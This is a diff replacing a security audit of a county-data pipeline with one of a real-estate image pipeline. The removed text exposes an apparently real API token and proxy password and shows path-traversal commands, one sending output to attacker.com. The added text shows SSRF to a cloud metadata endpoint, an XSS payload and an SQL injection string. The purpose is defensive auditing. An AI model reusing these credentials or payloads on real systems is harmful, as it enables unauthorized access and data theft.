@@ -1,1610 +1,1182 @@
-# Security Audit Report: Maricopa County API Data Pipeline
+# Security Audit Report: PHX Houses Image Pipeline
 
-**Audit Date:** 2025-12-02
-**Auditor:** Security Audit (Automated)
-**Scope:** County data extraction pipeline (Phase 0)
-**Severity Levels:** CRITICAL | HIGH | MEDIUM | LOW
+**Date:** 2025-12-02
+**Auditor:** Security Team
+**Scope:** Image extraction pipeline with focus on SSRF protection, input validation, file system security, authentication, state integrity, and network security
+**Severity Levels:** CRITICAL (P0) | HIGH (P1) | MEDIUM (P2) | LOW (P3)
 
 ---
 
 ## Executive Summary
 
-This security audit examined the Maricopa County Assessor API data pipeline across 4 core files and 3 supporting modules. The pipeline demonstrates **strong security fundamentals** with proper SQL injection prevention and input sanitization. However, **CRITICAL vulnerabilities** were identified in secrets management and several HIGH-priority issues require remediation.
+This security audit evaluated the real estate image extraction pipeline across 6 key security domains. The system demonstrates strong foundational security controls with defense-in-depth principles applied throughout. **No CRITICAL vulnerabilities were identified.**
 
-### Key Findings
-- **1 CRITICAL** - API token exposed in committed .env file
-- **3 HIGH** - Path traversal risks, unsafe file operations, token logging
-- **5 MEDIUM** - Error handling improvements, validation gaps
-- **4 LOW** - Hardening opportunities, best practices
+**Overall Security Posture:** STRONG
 
-### Overall Risk Assessment
-**MEDIUM-HIGH RISK** - Core security controls are present but secrets exposure and file system vulnerabilities create significant attack surface.
+**Key Strengths:**
+- Comprehensive SSRF protection with allowlist validation and DNS resolution checks
+- Multi-layer image bomb protection (file size, pixel limits, decompression detection)
+- Atomic file writes preventing corruption
+- Content-Type validation with strict allowlist
+- Environment-based secrets management
+
+**Key Recommendations:**
+- Implement magic byte validation for uploaded files (HIGH priority)
+- Add logging sanitization to prevent credential leaks (HIGH priority)
+- Enhance symlink security with race condition protection (MEDIUM priority)
+- Implement URL redirect validation (MEDIUM priority)
 
 ---
 
-## CRITICAL Issues (Must Fix Immediately)
+## 1. SSRF Protection
 
-### CRIT-001: API Token Committed to Repository
+**File:** `src/phx_home_analysis/services/infrastructure/url_validator.py`
 
-**File:** `.env:6`
-**Severity:** CRITICAL
-**CVSS Score:** 9.8 (Critical)
+### Findings
 
+#### ✅ STRENGTHS (No Issues)
+
+1. **Fail-Closed Design** (Lines 46-58)
+   - Default-deny with explicit allowlist
+   - Unknown hosts are rejected by default
+   - Proper fail-closed error handling
+
+2. **Comprehensive Allowlist** (Lines 61-85)
+   - Trusted CDN domains for real estate images
+   - Zillow, Redfin, Realtor.com, county assessor sources
+   - Google Maps for legitimate map tiles
+
+3. **DNS Rebinding Protection** (Lines 300-354)
+   - Resolves hostnames to IPs before fetching
+   - Checks resolved IPs against blocked ranges
+   - Prevents time-of-check-time-of-use (TOCTOU) attacks
+
+4. **Extensive IP Blocking** (Lines 88-108)
+   - RFC 1918 private ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
+   - Loopback (127.0.0.0/8), link-local (169.254.0.0/16)
+   - IPv6 ranges (::1/128, fc00::/7, fe80::/10)
+   - Cloud metadata IPs, carrier-grade NAT, multicast, broadcast
+
+5. **Scheme Validation** (Lines 177-188)
+   - Only HTTP/HTTPS allowed
+   - Blocks file://, ftp://, gopher://, data:// URIs
+
+6. **Raw IP Blocking** (Lines 265-298)
+   - Rejects raw IP addresses in strict mode
+   - Prevents bypassing DNS-based allowlist
+
+7. **Parent Domain Matching** (Lines 256-262)
+   - Allows subdomains (e.g., "img.zillowstatic.com" matches "zillowstatic.com")
+   - Reduces maintenance overhead while maintaining security
+
+#### ⚠️ MEDIUM PRIORITY (P2)
+
+**M-1: No URL Redirect Validation**
+
+**Location:** `url_validator.py` (validation happens before fetch, but redirects occur during fetch)
+**File Reference:** `stealth_http_client.py:179` (allows redirects without re-validation)
+
+**Issue:** The validator checks URLs before fetching, but the HTTP client allows redirects without re-validation. An attacker could use an allowed CDN domain that redirects to an internal IP.
+
+**Exploitation Scenario:**
 ```python
-# .env (line 6)
-MARICOPA_ASSESSOR_TOKEN=0fb33394-8cdb-4ddd-b7bb-ab1e005c2c29
+# Attacker compromises or registers domain "evil.zillowstatic.com"
+# which is allowed by parent domain matching
+url = "https://evil.zillowstatic.com/image.jpg"
+# URL passes validation
+# Server redirects to http://169.254.169.254/latest/meta-data/
+# AWS metadata endpoint is accessed
 ```
 
-**Issue:**
-The `.env` file containing production API tokens and proxy credentials is committed to the repository. This file should NEVER be in version control.
-
-**Impact:**
-- Exposed API token allows unauthorized access to Maricopa County Assessor API
-- Exposed proxy credentials (`PROXY_USERNAME`, `PROXY_PASSWORD`) enable abuse of paid proxy service
-- Potential rate limit exhaustion, data exfiltration, service abuse
-- Financial liability for proxy usage
-
-**Evidence:**
-```bash
-# File is tracked in git
-git ls-files .env
-# Returns: .env
-
-# Contains sensitive credentials
-MARICOPA_ASSESSOR_TOKEN=0fb33394-8cdb-4ddd-b7bb-ab1e005c2c29
-PROXY_PASSWORD=g2j2p2cv602u
-```
+**Impact:** Access to cloud metadata endpoints, internal services, or localhost
 
 **Remediation:**
-```bash
-# 1. Remove from git history (IMMEDIATELY)
-git filter-branch --force --index-filter \
-  'git rm --cached --ignore-unmatch .env' \
-  --prune-empty --tag-name-filter cat -- --all
-
-# 2. Force push to remote (coordinate with team)
-git push origin --force --all
-
-# 3. Rotate compromised credentials
-# - Request new MARICOPA_ASSESSOR_TOKEN from county
-# - Reset Webshare proxy password
-
-# 4. Verify .gitignore contains .env
-echo ".env" >> .gitignore
-
-# 5. Create template only
-cat > .env.example <<EOF
-MARICOPA_ASSESSOR_TOKEN=your_token_here
-PROXY_SERVER=your_proxy_server
-PROXY_USERNAME=your_username
-PROXY_PASSWORD=your_password
-EOF
-```
-
-**Prevention:**
-- Add pre-commit hook to block .env files
-- Use git-secrets or similar tools
-- Regular secret scanning with TruffleHog or GitGuardian
-- Store secrets in secure vaults (HashiCorp Vault, AWS Secrets Manager)
-
----
-
-## HIGH Issues (Should Fix Soon)
-
-### HIGH-001: Path Traversal Vulnerability in File Operations
-
-**File:** `scripts/extract_county_data.py:80-91`
-**Severity:** HIGH
-**CVSS Score:** 7.5 (High)
-
 ```python
-# extract_county_data.py (lines 80-91)
-parser.add_argument(
-    "--csv",
-    type=Path,
-    default=Path("data/phx_homes.csv"),
-    help="Input CSV file with properties (default: data/phx_homes.csv)",
+# In stealth_http_client.py download_image() method:
+
+# Option 1: Disable redirects entirely
+response = await session.get(url, headers=request_headers, allow_redirects=False)
+
+# Option 2: Validate redirect targets (recommended)
+import httpx
+response = await session.get(
+    url,
+    headers=request_headers,
+    follow_redirects=True,
+    event_hooks={
+        'response': [
+            lambda r: validator.validate_url(str(r.url))
+            if r.is_redirect else None
+        ]
+    }
 )
-parser.add_argument(
-    "--enrichment",
-    type=Path,
-    default=Path("data/enrichment_data.json"),
-    help="Enrichment JSON file to update (default: data/enrichment_data.json)",
-)
 ```
 
-**Issue:**
-User-supplied file paths are not validated or sanitized before use. An attacker can use path traversal sequences to read/write arbitrary files.
-
-**Attack Scenario:**
-```bash
-# Read sensitive files
-python scripts/extract_county_data.py --all \
-  --csv "../../../../etc/passwd" \
-  --enrichment "/tmp/stolen_data.json"
-
-# Overwrite system files (if permissions allow)
-python scripts/extract_county_data.py --all \
-  --enrichment "../../../critical_config.json"
-
-# Exfiltrate data to attacker-controlled location
-python scripts/extract_county_data.py --all \
-  --enrichment "//attacker.com/share/data.json"
-```
-
-**Impact:**
-- Arbitrary file read/write within user's permissions
-- Data exfiltration to attacker-controlled locations
-- Overwrite critical application data
-- Potential privilege escalation if combined with other vulnerabilities
-
-**Remediation:**
-```python
-# Add path validation function
-from pathlib import Path
-import os
-
-def validate_file_path(
-    path: Path,
-    allowed_base: Path = Path("data"),
-    must_exist: bool = False,
-) -> Path:
-    """Validate and sanitize file path to prevent traversal attacks.
-
-    Args:
-        path: User-supplied path
-        allowed_base: Base directory that path must be within
-        must_exist: If True, path must exist
-
-    Returns:
-        Resolved, validated Path object
-
-    Raises:
-        ValueError: If path is invalid or outside allowed base
-    """
-    try:
-        # Resolve to absolute path (eliminates .. sequences)
-        resolved_path = path.resolve()
-        resolved_base = allowed_base.resolve()
-
-        # Check if path is within allowed base
-        if not str(resolved_path).startswith(str(resolved_base)):
-            raise ValueError(
-                f"Path {path} is outside allowed directory {allowed_base}"
-            )
-
-        # Check existence if required
-        if must_exist and not resolved_path.exists():
-            raise ValueError(f"Path {path} does not exist")
-
-        return resolved_path
-
-    except (OSError, RuntimeError) as e:
-        raise ValueError(f"Invalid path {path}: {e}") from e
-
-# Apply validation in parse_args
-def parse_args() -> argparse.Namespace:
-    # ... existing parser setup ...
-
-    args = parser.parse_args()
-
-    # Validate paths
-    try:
-        args.csv = validate_file_path(args.csv, Path("data"), must_exist=True)
-        args.enrichment = validate_file_path(args.enrichment, Path("data"))
-    except ValueError as e:
-        parser.error(str(e))
-
-    return args
-```
-
-**References:**
-- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
-- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
+**Risk Score:** MEDIUM (requires domain compromise or DNS hijacking)
 
 ---
 
-### HIGH-002: Unsafe File Write Without Atomic Operations
+**M-2: Parent Domain Matching Too Permissive**
 
-**File:** `scripts/extract_county_data.py:135-149`
-**Severity:** HIGH
-**CVSS Score:** 6.5 (Medium-High)
+**Location:** `url_validator.py:256-262`
 
+**Issue:** The parent domain matching algorithm allows ANY subdomain level, which could be exploited if an attacker registers a subdomain under an allowed domain.
+
+**Example:**
 ```python
-# extract_county_data.py (lines 135-149)
-def save_enrichment(path: Path, data: dict) -> None:
-    """Save enrichment data to JSON.
-
-    Converts dict format back to list format for storage.
-    """
-    path.parent.mkdir(parents=True, exist_ok=True)
-
-    # Convert dict back to list format
-    data_list = [
-        {"full_address": addr, **props}
-        for addr, props in data.items()
-    ]
-
-    with open(path, "w", encoding="utf-8") as f:
-        json.dump(data_list, f, indent=2, ensure_ascii=False)
+# If "zillowstatic.com" is allowed
+# These would also be allowed:
+"attacker-subdomain.zillowstatic.com"  # If attacker can register
+"xss.photos.zillowstatic.com"           # Multiple levels deep
 ```
 
-**Issue:**
-File is written directly without atomic operations. If the write fails mid-operation (crash, disk full, ctrl+c), the JSON file will be corrupted and data will be lost.
-
-**Impact:**
-- Data corruption if write interrupted
-- Complete data loss (no backup mechanism)
-- No rollback capability
-- Difficult to recover from failures
+**Impact:** If attacker can register subdomain under allowed domain (via CDN provider, DNS takeover, or subdomain takeover vulnerability)
 
 **Remediation:**
 ```python
-import tempfile
-import shutil
-from pathlib import Path
-import json
-
-def save_enrichment(path: Path, data: dict) -> None:
-    """Save enrichment data to JSON with atomic write.
-
-    Uses atomic write pattern:
-    1. Write to temporary file in same directory
-    2. fsync to ensure data written to disk
-    3. Atomic rename over original file
-    4. Create backup before overwrite
-
-    Args:
-        path: Target JSON file path
-        data: Enrichment data dictionary
-    """
-    path.parent.mkdir(parents=True, exist_ok=True)
-
-    # Convert dict back to list format
-    data_list = [
-        {"full_address": addr, **props}
-        for addr, props in data.items()
-    ]
-
-    # Create backup of existing file
-    if path.exists():
-        backup_path = path.with_suffix(f".json.backup.{int(time.time())}")
-        shutil.copy2(path, backup_path)
-
-        # Cleanup old backups (keep last 5)
-        backups = sorted(
-            path.parent.glob(f"{path.stem}.json.backup.*"),
-            key=lambda p: p.stat().st_mtime,
-            reverse=True
-        )
-        for old_backup in backups[5:]:
-            old_backup.unlink()
-
-    # Atomic write via temporary file
-    temp_fd, temp_path = tempfile.mkstemp(
-        dir=path.parent,
-        prefix=f".{path.name}.",
-        suffix=".tmp"
-    )
-
-    try:
-        with os.fdopen(temp_fd, 'w', encoding='utf-8') as f:
-            json.dump(data_list, f, indent=2, ensure_ascii=False)
-            f.flush()
-            os.fsync(f.fileno())  # Ensure written to disk
-
-        # Atomic rename (on POSIX, overwrites atomically)
-        os.replace(temp_path, path)
-
-    except Exception as e:
-        # Cleanup temp file on error
-        try:
-            os.unlink(temp_path)
-        except OSError:
-            pass
-        raise DataSaveError(f"Failed to save enrichment data: {e}") from e
-```
-
-**Testing:**
-```python
-# Test interruption during write
-def test_atomic_write_interruption():
-    """Verify file integrity after interrupted write."""
-    # Original data
-    original = {"addr1": {"lot_sqft": 8000}}
-    save_enrichment(path, original)
-
-    # Simulate write interruption
-    with mock.patch('json.dump', side_effect=KeyboardInterrupt):
-        with pytest.raises(KeyboardInterrupt):
-            save_enrichment(path, {"addr2": {"lot_sqft": 9000}})
-
-    # Original file should be intact
-    loaded = load_enrichment(path)
-    assert loaded == original
-```
-
----
-
-### HIGH-003: API Token Potentially Logged in Error Messages
-
-**File:** `src/phx_home_analysis/services/county_data/assessor_client.py:142-149`
-**Severity:** HIGH
-**CVSS Score:** 6.8 (Medium-High)
-
-```python
-# assessor_client.py (lines 138-149)
-async def _search_official_api(self, street: str) -> str | None:
-    """Search via Official API."""
-    url = f"{OFFICIAL_API_BASE}/search/property/"
-    params = {"q": street}
-    headers = {"AUTHORIZATION": self._token}  # Token in headers
-
-    try:
-        response = await self._http.get(url, params=params, headers=headers)
-        # ... error handling ...
-    except httpx.HTTPError as e:
-        logger.debug(f"Official API search failed: {e}")  # May log token
-```
-
-**Issue:**
-httpx exceptions may include request headers containing the API token. Debug logging could expose tokens in log files.
-
-**Impact:**
-- Token exposure in application logs
-- Token visible in crash reports/error traces
-- Unauthorized API access if logs are compromised
-
-**Remediation:**
-```python
-class MaricopaAssessorClient:
-    """HTTP client with secure logging."""
-
-    def __init__(self, ...):
-        # ... existing init ...
-
-        # Create HTTP client with custom event hooks
-        self._http = httpx.AsyncClient(
-            timeout=self._timeout,
-            event_hooks={
-                'request': [self._log_request_safe],
-                'response': [self._log_response_safe],
-            }
-        )
-
-    async def _log_request_safe(self, request: httpx.Request):
-        """Log request without sensitive headers."""
-        safe_headers = {
-            k: '***REDACTED***' if k.upper() in ('AUTHORIZATION', 'API-KEY', 'X-API-KEY')
-            else v
-            for k, v in request.headers.items()
-        }
-        logger.debug(f"Request: {request.method} {request.url}, headers={safe_headers}")
-
-    async def _log_response_safe(self, response: httpx.Response):
-        """Log response without sensitive data."""
-        logger.debug(f"Response: {response.status_code} from {response.url}")
-
-    async def _search_official_api(self, street: str) -> str | None:
-        """Search via Official API with safe error handling."""
-        url = f"{OFFICIAL_API_BASE}/search/property/"
-        params = {"q": street}
-        headers = {"AUTHORIZATION": self._token}
-
-        try:
-            response = await self._http.get(url, params=params, headers=headers)
-
-            if response.status_code == 401:
-                logger.warning("Official API auth failed (token may be invalid)")
-                return None
-
-            # ... rest of handling ...
-
-        except httpx.HTTPError as e:
-            # Never log exception directly (may contain headers)
-            logger.debug(f"Official API search failed: {type(e).__name__} for {street}")
-            return None
-```
-
-**Additional Hardening:**
-```python
-# Add to logging configuration
-import logging
-
-class SensitiveDataFilter(logging.Filter):
-    """Filter sensitive data from log records."""
-
-    SENSITIVE_PATTERNS = [
-        r'MARICOPA_ASSESSOR_TOKEN=[\w-]+',
-        r'AUTHORIZATION[\'"]?\s*:\s*[\'"]?[\w-]+',
-        r'token=[\w-]+',
-    ]
-
-    def filter(self, record: logging.LogRecord) -> bool:
-        message = record.getMessage()
-        for pattern in self.SENSITIVE_PATTERNS:
-            message = re.sub(pattern, r'***REDACTED***', message)
-        record.msg = message
+def _is_host_allowed(self, host: str) -> bool:
+    """Check if host is in the allowlist with depth limit."""
+    if host in self.allowed_hosts:
         return True
 
-# Apply filter
-logger = logging.getLogger(__name__)
-logger.addFilter(SensitiveDataFilter())
+    # Only check ONE parent level for security
+    parts = host.split(".")
+    if len(parts) >= 2:
+        parent = ".".join(parts[-2:])  # Only immediate parent
+        if parent in self.allowed_hosts:
+            return True
+
+    return False
 ```
+
+**Risk Score:** MEDIUM (requires attacker control over subdomain)
 
 ---
 
-### HIGH-004: No Rate Limiting on File Operations
+## 2. Input Validation & Sanitization
 
-**File:** `scripts/extract_county_data.py:461-492`
-**Severity:** HIGH
-**CVSS Score:** 5.3 (Medium)
+**Files:**
+- `src/phx_home_analysis/services/image_extraction/standardizer.py`
+- `src/phx_home_analysis/services/infrastructure/stealth_http_client.py`
 
-```python
-# extract_county_data.py (lines 461-492)
-async with MaricopaAssessorClient(rate_limit_seconds=args.rate_limit) as client:
-    for i, prop in enumerate(properties, 1):
-        print(f"[{i}/{len(properties)}] {prop.street}")
+### Findings
 
-        try:
-            parcel = await client.extract_for_address(prop.street)
-            # ... process ...
+#### ✅ STRENGTHS
 
-            # Merge and SAVE on EVERY iteration
-            if not args.dry_run:
-                updated_entry, conflicts = merge_parcel_into_enrichment(...)
-                enrichment[prop.full_address] = updated_entry
+1. **Image Bomb Protection** (standardizer.py:14-22)
+   ```python
+   Image.MAX_IMAGE_PIXELS = 178956970  # ~15000 x 12000 pixels
+   MAX_RAW_FILE_SIZE = 50 * 1024 * 1024  # 50MB
+   ```
+   - Prevents decompression bombs at PIL level
+   - File size check BEFORE opening image
+   - Defense-in-depth with both size and pixel limits
 
-        except Exception as e:
-            logger.error(f"  Error: {e}")
+2. **Multi-Stage Size Validation** (stealth_http_client.py:236-270)
+   - Checks Content-Length header before download
+   - Validates actual downloaded size
+   - Prevents resource exhaustion attacks
+
+3. **Content-Type Validation** (stealth_http_client.py:115-121, 218-233)
+   ```python
+   ALLOWED_CONTENT_TYPES = {
+       "image/jpeg", "image/png", "image/webp",
+       "image/gif", "image/jpg"
+   }
+   ```
+   - Strict allowlist of image MIME types
+   - Rejects HTML, scripts, executables
+
+4. **Format Conversion** (standardizer.py:106-147)
+   - Converts all images to RGB PNG
+   - Handles RGBA with alpha channel properly
+   - Sanitizes palette modes and grayscale
+
+5. **Dimension Limits** (standardizer.py:149-175)
+   - Max 1024px dimension with aspect ratio preservation
+   - High-quality Lanczos resampling
+   - Prevents extremely large images in storage
+
+#### 🔴 HIGH PRIORITY (P1)
+
+**H-1: No Magic Byte Validation**
+
+**Location:** `standardizer.py:83`, `stealth_http_client.py:256`
+
+**Issue:** The system trusts Content-Type headers and file extensions without validating magic bytes. An attacker could send malicious content with an image Content-Type.
+
+**Exploitation Scenario:**
+```http
+HTTP/1.1 200 OK
+Content-Type: image/png
+Content-Length: 1024
+
+<!-- Actual content is HTML with XSS payload -->
+<html><script>alert('XSS')</script></html>
 ```
 
-**Issue:**
-While API calls are rate-limited, there's no rate limiting on file I/O operations. The enrichment file is saved after EVERY property extraction (line 494), which is inefficient and creates a DoS vulnerability.
-
 **Impact:**
-- Disk I/O exhaustion with large property lists
-- Unnecessary wear on SSD storage
-- Potential DoS if processing thousands of properties
-- Performance degradation
+- Malicious files stored as images
+- If images are served without re-validation, could lead to XSS
+- Polyglot files (valid image + embedded script)
 
 **Remediation:**
 ```python
-# Batch file writes instead of per-property writes
-async def main() -> int:
-    # ... existing setup ...
+# Add to standardizer.py after line 80:
 
-    results = []
-    failed = []
-    all_conflicts = {}
+MAGIC_BYTES = {
+    b'\xFF\xD8\xFF': 'jpeg',
+    b'\x89PNG\r\n\x1a\n': 'png',
+    b'GIF87a': 'gif',
+    b'GIF89a': 'gif',
+    b'RIFF': 'webp',  # Must check for 'WEBP' at offset 8
+}
 
-    # Batch size for file writes
-    BATCH_SIZE = 50
-    write_counter = 0
+def _validate_magic_bytes(self, image_data: bytes) -> bool:
+    """Validate file starts with known image magic bytes."""
+    for magic, format_name in MAGIC_BYTES.items():
+        if image_data.startswith(magic):
+            # Additional check for WEBP
+            if format_name == 'webp':
+                if len(image_data) < 12 or image_data[8:12] != b'WEBP':
+                    return False
+            return True
+    return False
 
-    async with MaricopaAssessorClient(rate_limit_seconds=args.rate_limit) as client:
-        for i, prop in enumerate(properties, 1):
-            print(f"[{i}/{len(properties)}] {prop.street}")
+# In standardize() method before line 83:
+if not self._validate_magic_bytes(image_data):
+    raise ImageProcessingError(
+        "Invalid image format: magic bytes do not match image type"
+    )
+```
 
+**Risk Score:** HIGH (bypass of security controls, potential for malicious content storage)
+
+---
+
+**H-2: EXIF Metadata Not Sanitized**
+
+**Location:** `standardizer.py:92-93`
+
+**Issue:** PIL saves images with `optimize=True` but does not explicitly strip EXIF metadata. Some EXIF fields could contain injection payloads or privacy-sensitive data.
+
+**Exploitation Scenario:**
+```python
+# Attacker embeds malicious EXIF comment
+exif_comment = "'; DROP TABLE properties; --"
+# Or privacy leak
+exif_gps = {"GPSLatitude": 33.4484, "GPSLongitude": -112.0740}
+```
+
+**Impact:**
+- Privacy leak (GPS coordinates, camera model, timestamps)
+- Potential injection if EXIF displayed in UI without escaping
+
+**Remediation:**
+```python
+# In standardizer.py, modify save line:
+img.save(
+    output,
+    format=self.output_format,
+    optimize=True,
+    exif=b''  # Strip all EXIF data
+)
+
+# Or use PIL's getexif() to selectively preserve safe fields:
+safe_exif = {}  # Only include width, height, orientation if needed
+img.save(output, format=self.output_format, optimize=True, exif=safe_exif)
+```
+
+**Risk Score:** HIGH (privacy leak + potential injection)
+
+---
+
+#### ⚠️ MEDIUM PRIORITY (P2)
+
+**M-3: Animated Image Handling**
+
+**Location:** `standardizer.py:250` (detects but doesn't handle)
+
+**Issue:** Animated GIFs/PNGs are detected but not explicitly handled. Could lead to oversized files or decompression issues.
+
+**Remediation:**
+```python
+def standardize(self, image_data: bytes) -> bytes:
+    # After line 83:
+    if hasattr(img, 'is_animated') and img.is_animated:
+        # Extract first frame only
+        img.seek(0)
+        img = img.copy()
+    # Continue with existing logic...
+```
+
+**Risk Score:** MEDIUM (resource exhaustion via animated images)
+
+---
+
+## 3. File System Security
+
+**Files:**
+- `src/phx_home_analysis/services/image_extraction/orchestrator.py`
+- `src/phx_home_analysis/services/image_extraction/naming.py`
+- `src/phx_home_analysis/services/image_extraction/symlink_views.py`
+
+### Findings
+
+#### ✅ STRENGTHS
+
+1. **Atomic File Writes** (orchestrator.py:155-175)
+   ```python
+   fd, temp_path = tf.mkstemp(dir=path.parent, suffix=".tmp")
+   try:
+       with os.fdopen(fd, "w", encoding="utf-8") as f:
+           json.dump(data, f, indent=2)
+       os.replace(temp_path, path)  # Atomic on POSIX and Windows
+   ```
+   - Temp file + rename prevents corruption
+   - Cleanup on exception
+   - Works on Windows and Unix
+
+2. **Property Hash Generation** (orchestrator.py:213-224)
+   ```python
+   hash_input = property.full_address.lower().strip()
+   return hashlib.sha256(hash_input.encode()).hexdigest()[:8]
+   ```
+   - Stable, deterministic hashing
+   - No user-controlled input in path
+   - 8-character hash prevents collisions
+
+3. **Directory Creation Safety** (orchestrator.py:105-106)
+   ```python
+   directory.mkdir(parents=True, exist_ok=True)
+   ```
+   - Safe recursive creation
+   - No race condition with exist_ok=True
+
+4. **Filename Validation** (naming.py:60-67)
+   ```python
+   if len(self.property_hash) != 8:
+       raise ValueError(f"property_hash must be 8 chars")
+   if not 0 <= self.confidence <= 99:
+       raise ValueError(f"confidence must be 0-99")
+   ```
+   - Strict validation of filename components
+   - No path traversal characters allowed
+
+5. **Structured Naming Convention** (naming.py:12-14)
+   - Format: `{hash}_{loc}_{subj}_{conf}_{src}_{date}[_{seq}].png`
+   - No user input in filenames
+   - Predictable, parseable structure
+
+#### ⚠️ MEDIUM PRIORITY (P2)
+
+**M-4: Symlink Race Condition**
+
+**Location:** `symlink_views.py:247-280`
+
+**Issue:** TOCTOU race condition between existence check and symlink creation:
+
+```python
+# Line 262-263
+if target.exists() or target.is_symlink():
+    return False
+# RACE WINDOW: attacker could create symlink here
+# Line 269-271
+target.symlink_to(rel_source)  # Could overwrite malicious symlink
+```
+
+**Exploitation Scenario:**
+1. Attacker creates symlink at `target` pointing to `/etc/passwd`
+2. Race window between check and creation
+3. Code follows symlink and overwrites sensitive file
+
+**Impact:** Overwrite of system files, privilege escalation
+
+**Remediation:**
+```python
+def _create_link(self, source: Path, target: Path) -> bool:
+    try:
+        target.parent.mkdir(parents=True, exist_ok=True)
+
+        # Use exclusive creation (fails if exists)
+        if self._can_symlink:
             try:
-                parcel = await client.extract_for_address(prop.street)
+                if self.use_relative_links:
+                    rel_source = os.path.relpath(source, target.parent)
+                    os.symlink(rel_source, target)  # Atomic, fails if exists
+                else:
+                    os.symlink(source.resolve(), target)
+            except FileExistsError:
+                return False  # Already exists, skip
+        else:
+            # Atomic copy on Windows
+            shutil.copy2(source, target)
 
-                if not parcel:
-                    print("  No data found")
-                    failed.append(prop.full_address)
-                    continue
+        return True
 
-                print_parcel_summary(parcel)
-                results.append((prop.full_address, parcel))
-
-                # Merge into enrichment (in-memory)
-                if not args.dry_run:
-                    updated_entry, conflicts = merge_parcel_into_enrichment(
-                        enrichment,
-                        prop.full_address,
-                        parcel,
-                        args.update_only,
-                        logger,
-                        tracker,
-                    )
-                    enrichment[prop.full_address] = updated_entry
-                    all_conflicts[prop.full_address] = conflicts
-                    write_counter += 1
-
-                    # Save periodically (every BATCH_SIZE properties)
-                    if write_counter >= BATCH_SIZE:
-                        logger.info(f"Saving batch checkpoint ({write_counter} properties)")
-                        save_enrichment(args.enrichment, enrichment)
-                        tracker.save()
-                        write_counter = 0
-
-            except Exception as e:
-                logger.error(f"  Error: {e}")
-                failed.append(prop.full_address)
-
-    # Final save (any remaining properties)
-    if not args.dry_run and (results or write_counter > 0):
-        save_enrichment(args.enrichment, enrichment)
-        tracker.save()
-        logger.info(f"Saved {len(enrichment)} records to {args.enrichment}")
-
-    # ... rest of function ...
+    except (OSError, PermissionError) as e:
+        logger.debug(f"Failed to create link {target}: {e}")
+        return False
 ```
+
+**Risk Score:** MEDIUM (requires local file system access + race timing)
 
 ---
 
-## MEDIUM Issues (Best Practice Improvements)
+**M-5: Windows Junction Security**
 
-### MED-001: Insufficient Input Validation on Address Strings
+**Location:** `symlink_views.py:74-102`
 
-**File:** `src/phx_home_analysis/services/county_data/assessor_client.py:394-411`
-**Severity:** MEDIUM
-**CVSS Score:** 5.3 (Medium)
-
-```python
-# assessor_client.py (lines 394-411)
-async def extract_for_address(self, street: str) -> ParcelData | None:
-    """Extract parcel data for a street address.
-
-    Combines search and data extraction.
-
-    Args:
-        street: Street address
-
-    Returns:
-        ParcelData if found, None otherwise
-    """
-    apn = await self.search_apn(street)
-    if not apn:
-        logger.info(f"No APN found for: {street}")
-        return None
-
-    logger.info(f"Found APN {apn} for {street}")
-    return await self.get_parcel_data(apn)
-```
-
-**Issue:**
-No validation on `street` parameter. Extremely long strings, null bytes, or malicious input could cause issues.
-
-**Impact:**
-- Resource exhaustion with extremely long addresses
-- Unexpected behavior with special characters
-- API errors with malformed addresses
+**Issue:** On Windows without admin rights, the code falls back to file copies instead of junctions. The detection logic could be more robust.
 
 **Remediation:**
 ```python
-import re
-
-MAX_ADDRESS_LENGTH = 200
-VALID_ADDRESS_PATTERN = re.compile(r'^[\w\s,.\-#]+$')
-
-def validate_address(address: str) -> str:
-    """Validate and sanitize address input.
-
-    Args:
-        address: Raw address string
-
-    Returns:
-        Sanitized address
-
-    Raises:
-        ValueError: If address is invalid
-    """
-    if not address or not isinstance(address, str):
-        raise ValueError("Address must be a non-empty string")
-
-    # Remove leading/trailing whitespace
-    address = address.strip()
-
-    # Check length
-    if len(address) > MAX_ADDRESS_LENGTH:
-        raise ValueError(f"Address too long (max {MAX_ADDRESS_LENGTH} chars)")
-
-    # Check for null bytes
-    if '\x00' in address:
-        raise ValueError("Address contains null bytes")
-
-    # Validate character set
-    if not VALID_ADDRESS_PATTERN.match(address):
-        raise ValueError("Address contains invalid characters")
-
-    return address
-
-async def extract_for_address(self, street: str) -> ParcelData | None:
-    """Extract parcel data for a street address.
-
-    Args:
-        street: Street address (validated)
-
-    Returns:
-        ParcelData if found, None otherwise
-
-    Raises:
-        ValueError: If address is invalid
-    """
-    # Validate input
-    street = validate_address(street)
-
-    apn = await self.search_apn(street)
-    if not apn:
-        logger.info(f"No APN found for: {street}")
-        return None
-
-    logger.info(f"Found APN {apn} for {street}")
-    return await self.get_parcel_data(apn)
-```
-
----
-
-### MED-002: No Validation of API Response Schema
-
-**File:** `src/phx_home_analysis/services/county_data/assessor_client.py:220-243`
-**Severity:** MEDIUM
-**CVSS Score:** 4.3 (Medium)
-
-```python
-# assessor_client.py (lines 220-243)
-async def _get_official_parcel(self, apn: str) -> ParcelData | None:
-    """Get parcel data from Official API."""
-    headers = {"AUTHORIZATION": self._token}
-
-    try:
-        # Get parcel details
-        url = f"{OFFICIAL_API_BASE}/parcel/{apn}"
-        response = await self._http.get(url, headers=headers)
-        response.raise_for_status()
-        parcel = response.json()  # No schema validation
-
-        # Get residential details
-        await self._apply_rate_limit()
-        res_url = f"{OFFICIAL_API_BASE}/parcel/{apn}/residential-details"
+def _check_symlink_capability(self) -> bool:
+    """Check if symlinks are supported with security validation."""
+    if os.name == "nt":
+        import ctypes
+        # Check for SeCreateSymbolicLinkPrivilege
         try:
-            res_response = await self._http.get(res_url, headers=headers)
-            residential = res_response.json() if res_response.status_code == 200 else {}
+            if ctypes.windll.shell32.IsUserAnAdmin():
+                return True
         except Exception:
-            residential = {}
-
-        # Valuation data
-        valuation = parcel.get("Valuations", [{}])[0] if parcel.get("Valuations") else {}
-
-        return self._map_official_response(apn, parcel, residential, valuation)
-```
-
-**Issue:**
-API responses are used directly without schema validation. Malformed or malicious responses could cause crashes or data corruption.
-
-**Impact:**
-- Application crashes with unexpected API changes
-- Silent data corruption with malformed responses
-- Difficult to debug API integration issues
-
-**Remediation:**
-```python
-from pydantic import BaseModel, Field, ValidationError
-from typing import Optional
-
-class MaricopaParcelResponse(BaseModel):
-    """Schema for Official API parcel response."""
-    APN: str
-    PropertyAddress: str
-    LotSize: Optional[int] = None
-    Valuations: list[dict] = Field(default_factory=list)
-
-class MaricopaResidentialResponse(BaseModel):
-    """Schema for residential details response."""
-    LotSize: Optional[int] = None
